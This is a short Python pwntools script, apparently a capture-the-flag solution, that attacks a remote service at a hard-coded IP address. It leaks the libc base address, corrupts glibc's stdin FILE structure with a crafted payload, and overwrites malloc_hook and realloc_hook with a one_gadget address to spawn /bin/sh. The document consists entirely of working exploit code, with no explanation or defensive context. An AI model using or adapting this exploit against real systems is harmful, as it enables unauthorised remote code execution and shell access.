from pwn import *

###Addr
#  libc2.27
malloc_hook_offset = 0x3ebc30
one_gadget_offset = 0x10a38c
realloc_hook_offset = 0x3ebc28
stdin_struct_offset = 0x3eba00
stdin_buf_base_offset = 0x3eba00+0x38
realloc_offset = 0x98c30+2

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
###
r = remote('3.112.41.140',56746)

r.sendlineafter('Size:',str(0x313370))
libc_base = int(r.recvline()[:-1].split(b'0x')[1],16)+0x313ff0
print(hex(libc_base))

r.sendlineafter('Value:\x00',hex((0x313ff0+stdin_buf_base_offset)//8)+' '+hex(libc_base+stdin_struct_offset))

payload  = p64(0xfbad208b)+p64(libc_base+stdin_struct_offset+0x83)+p64(libc_base+stdin_struct_offset-1)+p64(0)*4+p64(libc_base+stdin_struct_offset)+p64(libc_base+malloc_hook_offset+0x8)+p64(0)*5+p64(0x1000000000)+p64(0xffffffffffffffff)+b'\x00\x00\x00 '
payload += p64(0xfbad208b)+p64(libc_base+stdin_struct_offset+0x83)+p64(libc_base+stdin_struct_offset+0x83-0x237)+p64(libc_base+stdin_struct_offset+0x83)*5+p64(libc_base+stdin_struct_offset+0x84)+p64(0)*5+p64(0x1000000000)+p64(0xffffffffffffffff)+b'\x00\x00\x00a\x00\x00\x00\x00'+p64(libc_base+0x3ed8d0)+p64(0xffffffffffffffff)+p64(0)+p64(libc_base+0x3ebae0)+p64(0)*3+p64(0xffffffff)+p64(0)*2+p64(libc_base+0x3e82a0)+p64(0)*38+p64(libc_base+0x3e7d60)+p64(0)+p64(libc_base+0x97410)+p64(libc_base+one_gadget_offset)+p64(libc_base+realloc_offset)
payload += b'a'*0x1000

r.sendlineafter('Value:\x00',payload)
r.interactive()
